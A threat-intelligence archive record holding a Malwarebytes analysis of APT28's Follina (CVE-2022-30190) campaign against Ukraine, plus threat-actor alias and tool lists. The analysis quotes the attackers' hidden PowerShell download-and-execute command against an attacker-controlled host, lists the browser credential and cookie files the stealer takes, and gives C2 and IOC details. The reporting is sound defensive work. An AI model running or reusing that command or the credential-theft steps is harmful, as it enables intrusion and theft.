{
    "id": "f0aa8b87-8e07-40b4-8425-1065305dd7f2",
    "created_at": "2023-01-12T15:06:38.544305Z",
    "updated_at": "2025-03-27T02:17:11.798308Z",
    "deleted_at": null,
    "sha1_hash": "300a537f66d1e4e8c4d04bfd27af3ff3ce4c4f36",
    "title": "2022-06-21 - Russia’s APT28 uses fear of nuclear war to spread Follina docs in Ukraine",
    "authors": "",
    "file_creation_date": "2022-07-02T23:14:25Z",
    "file_modification_date": "2022-07-02T23:14:25Z",
    "file_size": 1863623,
    "plain_text": "# Russia’s APT28 uses fear of nuclear war to spread Follina docs in Ukraine\n\n**blog.malwarebytes.com/threat-intelligence/2022/06/russias-apt28-uses-fear-of-nuclear-war-to-spread-follina-docs-in-**\nukraine/\n\nThreat Intelligence Team June 21, 2022\n\n_This blog post was authored by Hossein Jazi and Roberto Santos._\n\nIn a recent campaign, APT28, an advanced persistent threat actor linked with Russian\nintelligence, set its sights on Ukraine, targeting users with malware that steals credentials\nstored in browsers.\n\nAPT28 (also known as Sofacy and Fancy Bear) is a notorious Russian threat actor that has\nbeen active since at least 2004 with its main activity being collecting intelligence for the\nRussian government. The group is known to have targeted US politicians, and US\norganizations, including US nuclear facilities.\n\n[On June 20, 2022, Malwarebytes Threat Intelligence identified a document that had been](https://twitter.com/h2jazi/status/1538957205210337280)\n[weaponized with the Follina (CVE-2022-30190) exploit to download and execute a new .Net](https://blog.malwarebytes.com/exploits-and-vulnerabilities/2022/05/microsoft-office-zero-day-follina-its-not-a-bug-its-a-feature-its-a-bug/)\nstealer first reported by [Google. The discovery was also made independently by CERT-UA.](https://blog.google/threat-analysis-group/update-on-cyber-activity-in-eastern-europe/)\n\nFollina is a recently-discovered zero-day exploit that uses the `ms-msdt protocol to load`\nmalicious code from Word documents when they are opened. This is the first time we’ve\nobserved APT28 using Follina in its operations.\n\n\n-----\n\n## The malicious document\n\nThe maldoc’s filename, `Nuclear Terrorism A Very Real Threat.rtf, attempts to get`\nvictims to open it by preying on their fears that the invasion of Ukraine will escalate into a\nnuclear conflict.\n\n[The content of the document is an article from the Atlantic Council called “Will Putin use](https://www.atlanticcouncil.org/blogs/new-atlanticist/will-putin-use-nuclear-weapons-in-ukraine-our-experts-answer-three-burning-questions/)\n_nuclear weapons in Ukraine? Our experts answer three burning questions” published on May_\n10 this year.\n\n\n-----\n\nThe lure asks “Will Putin use nuclear weapons in Ukraine?”\nThe maldoc is a docx file (pretending to be a RTF file) compiled on June 10, which suggests\nthat the attack was used around the same time. It uses a remote template embedded in the\n```\nDocument.xml.rels file to retrieve a remote HTML file from the URL http://kitten\n```\n268.frge.io/article.html.\n\n\n-----\n\nThe malicious HTML document\nThe HTML file uses a JavaScript call to `window.location.href to load and execute an`\nencoded PowerShell script using the `ms-msdt MSProtocol URI scheme. The decoded`\nscript uses `cmd to run PowerShell code that downloads and executes the final payload:`\n```\n\"C:\\WINDOWS\\system32\\cmd.exe\" /k powershell -NonInteractive -WindowStyle Hidden NoProfile -command \"& {iwr http://kompartpomiar.pl/grafika/SQLite.Interop.dll OutFile \"C:\\Users\\$ENV:UserName\\SQLite.Interop.dll\";iwr\nhttp://kompartpomiar.pl/grafika/docx.exe -OutFile\n\"C:\\Users\\$ENV:UserName\\docx.exe\";Start-Process \"C:\\Users\\$ENV:UserName\\docx.exe\"}\"\n\n## Payload Analysis\n\n```\n[The final payload is a variant of a stealer APT28 has used against targets in Ukraine before.](https://blog.google/threat-analysis-group/update-on-cyber-activity-in-eastern-europe/)\nIn the oldest variant, the stealer used a fake error message to hide what it was doing (A\nsecondary thread was displaying this error message while the main program continued\nexecuting.) The new variant does not show the popup.\n\nIn older versions of the\n\nstealer, a fake error message distracted users\nThe variant used in this attack is almost identical to the one reported by Google, with just a\nfew minor refactors and some additional sleep commands.\n\n\n-----\n\nA side-by-side comparison of two versions of the APT28 stealer\nAs with the previous variant, the stealer’s main pupose is to steal data from several popular\nbrowsers.\n\n### Google Chrome and Microsoft Edge\n\nThe malware steals any website credentials (username, password, and url) users have\nsaved in the browser by reading the contents of `%LOCALAPPDATA%\\Google\\Chrome\\User`\n```\nData\\Default\\Login Data .\n\n```\n\n-----\n\nDebugging session showing how attackers are capable of stealing credentials\nIn a very similar way, the new variant also grabs all the saved cookies stored in Google\nChrome by accessing `%LOCALAPPDATA%\\Google\\Chrome\\User`\n```\nData\\Default\\Network\\Cookies .\n\n```\nCookie stealing code (Google Chrome)\nStolen cookies can sometimes be used to break into websites even if the username and\npassword aren’t saved to the browser.\n\nThe code to steal cookies and passwords from the Chromium-based Edge browser is almost\nidentical to the code used for Chrome.\n\n### Firefox\n\nThis malware can also steal data from Firefox. It does this by iterating through every profile\nlooking for the `cookies.sqlite file that stores the cookies for each user.`\n\n\n-----\n\nSysmon capturing access to cookies.sqlite file\nIn the case of passwords, the attackers attempt to steal `logins.json,` `key3.db,`\n```\nkey4.db, cert8.db, cert9.db, signons.sqlite .\n\n```\nAttackers will grab also passwords from Firefox\nThese files are necessary for recovering elements like saved passwords and certificates. Old\nversions are also supported ( signons.sqlite, `key3.db and` `cert8.db are no longer`\nused by new Firefox versions). Note that if the user has set a master password, the attackers\nwill likely attempt to crack this password offline, later, to recover these credentials.\n\n## Exfiltrating data\n\nThe malware uses the IMAP email protocol to exfiltrate data to its command and control (C2)\nserver.\n\n\n-----\n\nThe IMAP login event\nThe old variant of this stealer connected to mail[.]sartoc.com (144.208.77.68) to exfiltrate\ndata. The new variant uses the same method but a different domain, www.specialityllc[.]com.\nInterestingly both are located in Dubai.\n\nIt’s likely the owners of the C2 websites have nothing to do with APT28, and the group\nsimply took advantage of abandoned or vulnerable sites.\n\nAlthough ransacking browsers might look like petty theft, passwords are the key to accessing\nsensitive information and intelligence. The target, and the involvement of APT28, a division\nof Russian military intelligence), suggests that campaign is a part of the conflict in Ukraine, or\nat the very least linked to the foreign policy and military objectives of the Russian state.\nUkraine continues to be a battleground for cyberattacks and espionage, as well as\ndevastating kinetic warfare and humanitarian abuses.\n\nFor more coverage of threat actors active in the Ukraine conflict, read our recent article\nabout the efforts of an unknown APT group that has targeted Russia repeatedly since\nUkraine invasion.\n\n## Protection\n\nMalwarebytes customers were proactively protected against this campaign thanks to our\nanti-exploit protection.\n\n\n-----\n\n## IOCs\n\n**Maldoc:**\n\nNuclear Terrorism A Very Real Threat.rtf\n\ndaaa271cee97853bf4e235b55cb34c1f03ea6f8d3c958f86728d41f418b0bf01\n\n**Remote template (Follina):**\n\nhttp://kitten-268.frge[.]io/article.html\n\n**Stealer:**\n\nhttp://kompartpomiar[.]pl/grafika/docx.exe\n\n2318ae5d7c23bf186b88abecf892e23ce199381b22c8eb216ad1616ee8877933\n\n**C2:**\n\nwww.specialityllc[.]com\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-06-21 - Russia’s APT28 uses fear of nuclear war to spread Follina docs in Ukraine.pdf"
    ],
    "report_names": [
        "2022-06-21 - Russia’s APT28 uses fear of nuclear war to spread Follina docs in Ukraine.pdf"
    ],
    "threat_actors": [
        {
            "id": "9f101d9c-05ea-48b9-b6f1-168cd6d06d12",
            "created_at": "2023-01-06T13:46:39.396409Z",
            "updated_at": "2025-03-27T02:00:03.074969Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "CHROMIUM",
                "ControlX",
                "Red Dev 10",
                "RedHotel",
                "Red Scylla",
                "TAG-22",
                "BRONZE UNIVERSITY",
                "AQUATIC PANDA",
                "Charcoal Typhoon",
                "BountyGlad"
            ],
            "source_name": "MISPGALAXY:Earth Lusca",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "6abcc917-035c-4e9b-a53f-eaee636749c3",
            "created_at": "2022-10-25T16:07:23.565337Z",
            "updated_at": "2025-03-27T02:02:09.868522Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "Bronze University",
                "Charcoal Typhoon",
                "Chromium",
                "Red Dev 10",
                "Red Scylla"
            ],
            "source_name": "ETDA:Earth Lusca",
            "tools": [
                "Agentemis",
                "AntSword",
                "BIOPASS",
                "BIOPASS RAT",
                "BadPotato",
                "Behinder",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "Doraemon",
                "FRP",
                "Fast Reverse Proxy",
                "FunnySwitch",
                "HUC Port Banner Scanner",
                "KTLVdoor",
                "Mimikatz",
                "NBTscan",
                "POISONPLUG.SHADOW",
                "PipeMon",
                "RbDoor",
                "RibDoor",
                "RouterGod",
                "SAMRID",
                "ShadowPad Winnti",
                "SprySOCKS",
                "WinRAR",
                "Winnti",
                "XShellGhost",
                "cobeacon",
                "fscan",
                "lcx",
                "nbtscan"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "e3767160-695d-4360-8b2e-d5274db3f7cd",
            "created_at": "2022-10-25T16:47:55.914348Z",
            "updated_at": "2025-03-27T02:05:17.411172Z",
            "deleted_at": null,
            "main_name": "IRON TWILIGHT",
            "aliases": [
                "ATK5 ",
                "Blue Athena ",
                "BlueDelta ",
                "FROZENLAKE ",
                "Fancy Bear ",
                "Fighting Ursa ",
                "Forest Blizzard ",
                "GRAPHITE ",
                "Group 74 ",
                "PawnStorm ",
                "STRONTIUM ",
                "Sednit ",
                "Snakemackerel ",
                "Sofacy ",
                "TG-4127 ",
                "Tsar Team ",
                "APT28 "
            ],
            "source_name": "Secureworks:IRON TWILIGHT",
            "tools": [
                " Downdelph",
                " Drovorub",
                " EVILTOSS",
                " HIDEDRV",
                " Headlace",
                " LoJack",
                " Powershell Empire",
                " SCONATO",
                " SEDUPLOADER",
                " SHARPFRONT",
                " Scaramouche",
                " Sedkit Exploit Kit",
                " Sofacy downloader",
                " X-Agent",
                " X-Tunnel",
                " Zebrocy",
                " reGeorg",
                "DEALERSCHOICE"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ae320ed7-9a63-42ed-944b-44ada7313495",
            "created_at": "2022-10-25T15:50:23.671663Z",
            "updated_at": "2025-03-27T02:00:55.518748Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "APT28",
                "IRON TWILIGHT",
                "SNAKEMACKEREL",
                "Group 74",
                "Sednit",
                "Sofacy",
                "Pawn Storm",
                "Fancy Bear",
                "STRONTIUM",
                "Tsar Team",
                "Threat Group-4127",
                "TG-4127",
                "Forest Blizzard",
                "FROZENLAKE"
            ],
            "source_name": "MITRE:APT28",
            "tools": [
                "Wevtutil",
                "certutil",
                "Forfiles",
                "DealersChoice",
                "Mimikatz",
                "ADVSTORESHELL",
                "Komplex",
                "HIDEDRV",
                "JHUHUGIT",
                "Koadic",
                "Winexe",
                "XTunnel",
                "Drovorub",
                "CORESHELL",
                "OLDBAIT",
                "Downdelph",
                "XAgentOSX",
                "USBStealer",
                "Zebrocy",
                "Fysbis",
                "LoJax"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d53593c3-2819-4af3-bf16-0c39edc64920",
            "created_at": "2022-10-27T08:27:13.212301Z",
            "updated_at": "2025-03-27T02:00:55.529662Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "Earth Lusca",
                "TAG-22",
                "Charcoal Typhoon",
                "CHROMIUM",
                "ControlX"
            ],
            "source_name": "MITRE:Earth Lusca",
            "tools": [
                "Mimikatz",
                "PowerSploit",
                "Tasklist",
                "certutil",
                "Cobalt Strike",
                "Winnti for Linux",
                "Nltest",
                "NBTscan",
                "ShadowPad"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d2516b8e-e74f-490d-8a15-43ad6763c7ab",
            "created_at": "2022-10-25T16:07:24.212584Z",
            "updated_at": "2025-03-27T02:02:10.141001Z",
            "deleted_at": null,
            "main_name": "Sofacy",
            "aliases": [
                "APT 28",
                "ATK 5",
                "Blue Athena",
                "BlueDelta",
                "FROZENLAKE",
                "Fancy Bear",
                "Fighting Ursa",
                "Forest Blizzard",
                "Grey-Cloud",
                "Grizzly Steppe",
                "Group 74",
                "GruesomeLarch",
                "ITG05",
                "Iron Twilight",
                "Operation DealersChoice",
                "Operation Dear Joohn",
                "Operation Komplex",
                "Operation Pawn Storm",
                "Operation Russian Doll",
                "Operation Steal-It",
                "Pawn Storm",
                "SIG40",
                "Sednit",
                "Snakemackerel",
                "Sofacy",
                "Strontium",
                "T-APT-12",
                "TA422",
                "TAG-0700",
                "TAG-110",
                "TG-4127",
                "Tsar Team",
                "UAC-0028",
                "UAC-0063"
            ],
            "source_name": "ETDA:Sofacy",
            "tools": [
                "ADVSTORESHELL",
                "AZZY",
                "Backdoor.SofacyX",
                "CHERRYSPY",
                "CORESHELL",
                "Carberp",
                "Computrace",
                "DealersChoice",
                "Delphacy",
                "Downdelph",
                "Downrage",
                "Drovorub",
                "EVILTOSS",
                "Foozer",
                "GAMEFISH",
                "GooseEgg",
                "Graphite",
                "HATVIBE",
                "HIDEDRV",
                "Headlace",
                "Impacket",
                "JHUHUGIT",
                "JKEYSKW",
                "Koadic",
                "Komplex",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "LoJack",
                "LoJax",
                "MASEPIE",
                "Mimikatz",
                "NETUI",
                "Nimcy",
                "OCEANMAP",
                "OLDBAIT",
                "PocoDown",
                "PocoDownloader",
                "Popr-d30",
                "ProcDump",
                "PythocyDbg",
                "SMBExec",
                "SOURFACE",
                "SPLM",
                "STEELHOOK",
                "Sasfis",
                "Sedkit",
                "Sednit",
                "Sedreco",
                "Seduploader",
                "Shunnael",
                "SkinnyBoy",
                "Sofacy",
                "SofacyCarberp",
                "SpiderLabs Responder",
                "Trojan.Shunnael",
                "Trojan.Sofacy",
                "USB Stealer",
                "USBStealer",
                "VPNFilter",
                "Win32/USBStealer",
                "WinIDS",
                "Winexe",
                "X-Agent",
                "X-Tunnel",
                "XAPS",
                "XTunnel",
                "Xagent",
                "Zebrocy",
                "Zekapab",
                "carberplike",
                "certutil",
                "certutil.exe",
                "fysbis",
                "webhp"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535998,
    "ts_updated_at": 1743041831,
    "ts_creation_date": 1656803665,
    "ts_modification_date": 1656803665,
    "files": {
        "pdf": "https://archive.orkl.eu/300a537f66d1e4e8c4d04bfd27af3ff3ce4c4f36.pdf",
        "text": "https://archive.orkl.eu/300a537f66d1e4e8c4d04bfd27af3ff3ce4c4f36.txt",
        "img": "https://archive.orkl.eu/300a537f66d1e4e8c4d04bfd27af3ff3ce4c4f36.jpg"
    }
}